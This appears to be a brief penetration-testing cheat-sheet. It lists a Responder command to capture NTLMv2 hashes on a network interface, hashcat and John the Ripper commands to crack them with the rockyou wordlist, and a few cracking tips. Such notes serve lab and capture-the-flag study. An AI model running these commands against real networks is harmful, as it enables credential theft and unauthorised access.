### sudo responder -l tun0 -dwPv

### ￼hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O

OR

### john --wordlist=/usr/share/wordlists/rockyou.txt --format=nt hash.txt
 
might need to use --show if already cracked  
could try rockyou2021.txt (90GB)